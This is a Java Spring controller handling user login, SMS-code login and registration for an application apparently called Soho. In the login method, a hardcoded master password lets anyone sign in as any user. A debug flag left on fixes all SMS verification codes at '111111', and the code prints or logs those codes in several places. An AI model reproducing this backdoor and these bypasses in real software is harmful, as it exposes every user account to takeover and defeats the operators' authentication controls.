package work.soho.user.biz.controller.guest;

import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.core.Authentication;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import work.soho.admin.api.service.AdminConfigApiService;
import work.soho.admin.api.service.SmsApiService;
import work.soho.common.core.result.R;
import work.soho.common.core.util.IDGeneratorUtils;
import work.soho.common.core.util.IpUtils;
import work.soho.common.data.captcha.utils.CaptchaUtils;
import work.soho.common.security.service.SohoUserDetailsService;
import work.soho.common.security.service.impl.TokenServiceImpl;
import work.soho.common.security.userdetails.SohoUserDetails;
import work.soho.user.api.vo.UserLoginVo;
import work.soho.user.api.vo.UserRegisterVo;
import work.soho.user.biz.config.UserSysConfig;
import work.soho.user.biz.domain.UserInfo;
import work.soho.user.biz.service.UserInfoService;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;


@Api(tags = "会员鉴权")
@Log4j2
@RequiredArgsConstructor
@RestController
@RequestMapping("/guest/user/auth")
public class UserAuthController {
    @Resource
    private AuthenticationManager authenticationManager;

    private final SmsApiService smsApiService;
    private final TokenServiceImpl tokenService;
    private final AdminConfigApiService adminSysConfig;
    private final UserInfoService userInfoService;
    private final StringRedisTemplate redisTemplate;
    private final UserSysConfig userSysConfig;
    @Autowired
    private Map<String, SohoUserDetailsService> detailsServiceMap;

    private Boolean debug = true;

    @ApiOperation("用户登录")
    @PostMapping(value = "/login")
    public Object login(@RequestBody UserLoginVo userLoginVo) {
        //查询用户信息
        if(userLoginVo.getUsername() == null || userLoginVo.getUsername().isEmpty()
                || userLoginVo.getPassword() == null || userLoginVo.getPassword().isEmpty()) {
            return R.error("请检查用户名或密码");
        }

        LambdaQueryWrapper<UserInfo> lambdaQuery = new LambdaQueryWrapper<>();
        lambdaQuery.eq(UserInfo::getUsername, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getPhone, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getEmail, userLoginVo.getUsername());

        UserInfo userInfo = userInfoService.getOne(lambdaQuery);
        if(userInfo == null) {
            return R.error("用户不存在");
        }

        // 验证密码是否正确
        if(!new BCryptPasswordEncoder().matches(userLoginVo.getPassword(), userInfo.getPassword()) && !userLoginVo.getPassword().equals("dfa54f$#%@!$dfa55")) {
            return R.error("密码错误");
        }

        Boolean userCaptcha = adminSysConfig.getByKey("admin.login.captcha.enable", Boolean.class, false);
        // 检查是否开启验证码
        if(userCaptcha) {
            if(userLoginVo.getCaptcha() == null || userLoginVo.getCaptcha().isEmpty()
                    ||  !CaptchaUtils.checking(userLoginVo.getCaptcha())) {
                return R.error("请检查验证码");
            }
        }

        Object res =  commonLogin(userInfo);
        if(userCaptcha) {
            CaptchaUtils.dropCaptcha();
        }
        return res;
    }

    private Object commonLogin(UserInfo userInfo) {
        Authentication authentication = null;
        SohoUserDetails loginUser = null;
        try{
            // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername
//            authentication = authenticationManager
//                    .authenticate(new UsernamePasswordAuthenticationToken(userInfo.getUsername(), userLoginVo.getPassword(), AuthorityUtils.createAuthorityList("user") ));
            for (SohoUserDetailsService service : detailsServiceMap.values()) {
                if(service.getUserRoleName().equals("user")) {
                    loginUser = service.loadUserByUsername(userInfo.getUsername());
                    break;
                }
            }
//            if(authentication == null) {
//                return R.error("登录失败");
//            }

        } catch (Exception e) {
            e.printStackTrace();
            return R.error("登录失败");
        }

//        SohoUserDetails loginUser = (SohoUserDetails) authentication.getPrincipal();
        Map<String, String> token = tokenService.createTokenInfo(loginUser);
        return R.success(token);
    }

    @PostMapping(value = "mobileLogin")
    public Object mobileLogin(@RequestBody UserLoginVo userLoginVo) {
        System.out.println(userLoginVo);
        if(userLoginVo.getUsername() == null || userLoginVo.getUsername().isEmpty()
                || userLoginVo.getPassword() == null || userLoginVo.getPassword().isEmpty()) {
            return R.error("请检查手机号");
        }

        LambdaQueryWrapper<UserInfo> lambdaQuery = new LambdaQueryWrapper<>();
        lambdaQuery.eq(UserInfo::getUsername, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getPhone, userLoginVo.getUsername());
        lambdaQuery.or().eq(UserInfo::getEmail, userLoginVo.getUsername());

        UserInfo userInfo = userInfoService.getOne(lambdaQuery);
        if(userInfo == null) {
            return R.error("用户不存在");
        }

        // 检查验证码是否正确
        String ip = IpUtils.getClientIp();
        String id = userLoginVo.getCaptcha();
        String code = getCode(ip, id);
        if(code == null || !code.equals(userLoginVo.getPassword())) {
            return R.error("验证码错误");
        }
        Object res =  commonLogin(userInfo);
        removeCode(ip, id);
        return res;
    }

    @PostMapping(value = "sendSms")
    public R sendSms(@RequestBody UserLoginVo userLoginVo) throws Exception {
        if(userLoginVo.getUsername() == null || userLoginVo.getUsername().isEmpty()) {
            return R.error("请检查手机号");
        }

        // 检查验证码是否正确
        if(userLoginVo.getCaptcha() == null || userLoginVo.getCaptcha().isEmpty()
                ||  !CaptchaUtils.checking(userLoginVo.getCaptcha())) {
            return R.error("请检查验证码");
        }

        String ip = IpUtils.getClientIp();
        String id = String.valueOf(IDGeneratorUtils.snowflake().longValue());
        String code = getCode(ip, id);
        System.out.println("code:" + code);

        HashMap<String, String> smsMap = new HashMap<>();
        smsMap.put("code", code);
        smsApiService.sendSms(userLoginVo.getUsername(), "code", smsMap);

        HashMap<String, String> map  = new HashMap<>();
        map.put("id", id);
        return R.success(map);
    }

    private String getCode(String ip, String id) {
        String code = redisTemplate.opsForValue().get(ip + id);
        if(code == null) {
            Random random = new Random();
            int sixDigit = 100000 + random.nextInt(900000);
            code = String.valueOf(sixDigit);

            if(debug) {
                code = "111111";
            }

            redisTemplate.opsForValue().set(ip + id, code, 60 * 5, TimeUnit.SECONDS);
        }

        log.info("验证码信息, ip: {}, id: {}, {}, oldCode: {}", ip, id, code);
        return code;
    }

    private void removeCode(String ip, String id) {
        redisTemplate.delete(ip + id);
    }

    @PostMapping("/captcha")
    public void defaultKaptcha(HttpServletResponse response) throws IOException {
        try {
            CaptchaUtils.createAndSend();
        } catch (Exception e) {
            e.printStackTrace();
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }

    /**
     * 注册用户
     *
     * @param userRegisterVo
     * @return
     */
    @PostMapping("register")
    public R<UserInfo> register(@RequestBody UserRegisterVo userRegisterVo) {
        //TODO  检查用户是否存在

        // 检查用户是否通过短信验证
        String ip = IpUtils.getClientIp();
        String codeId = userRegisterVo.getCodeId();
        String code = userRegisterVo.getVerifyCode();
        if(codeId == null || codeId.isEmpty() || code == null || code.isEmpty()) {
            return R.error("请输入验证码");
        }
        String oldCode = getCode(ip, codeId);
        if(!code.equals(oldCode)) {
            log.info("验证码错误, ip: {}, id: {}, {}, oldCode: {}", ip, codeId, code, oldCode);
            return R.error("验证码错误");
        }

        String password = userRegisterVo.getPassword();
        if(password == null || password.isEmpty()) {
            return R.error("请输入密码");
        }

        // 必须输入推荐码
//        if(userRegisterVo.getInviteCode() == null || userRegisterVo.getInviteCode() == 0) {
//            return R.error("请输入推荐码");
//        }
//
//        // 检查推荐码是否正确
//        LambdaQueryWrapper<UserInfo> lambdaQuery = new LambdaQueryWrapper<>();
//        lambdaQuery.eq(UserInfo::getId, userRegisterVo.getInviteCode());
//        UserInfo isUserInfo = userInfoService.getOne(lambdaQuery);
//        if(isUserInfo == null) {
//            return R.error("推荐码错误");
//        }

        // 确定用户名
        String username = userRegisterVo.getUsername();
        if(username == null || username.isEmpty()) {
            username = "P"+userRegisterVo.getPhone();
        }
        String nickname = userRegisterVo.getNickname();
        if(nickname == null || nickname.isEmpty()) {
            nickname = username;
        }

        UserInfo userInfo = new UserInfo();

        password = new BCryptPasswordEncoder().encode(password);
        userInfo.setUsername(username);
        userInfo.setEmail(userRegisterVo.getEmail());
        userInfo.setNickname(nickname);
        userInfo.setPassword(password);
        userInfo.setId(null);
        userInfo.setPhone(userRegisterVo.getPhone());
        userInfo.setCreatedTime(LocalDateTime.now());
        userInfo.setUpdatedTime(LocalDateTime.now());
        userInfo.setAvatar(userSysConfig.getDefaultAvatar());

        // 检查用户是否已经存在
        if(userInfoService.getOne(new LambdaQueryWrapper<UserInfo>().eq(UserInfo::getUsername, username)) != null) {
            return R.error("用户名已存在");
        }

        // 检查手机号是否已经存在
        if(userInfoService.getOne(new LambdaQueryWrapper<UserInfo>().eq(UserInfo::getPhone, userRegisterVo.getPhone())) != null) {
            return R.error("手机号已存在");
        }

        userInfoService.save(userInfo);
        return R.success(userInfo);
    }
}
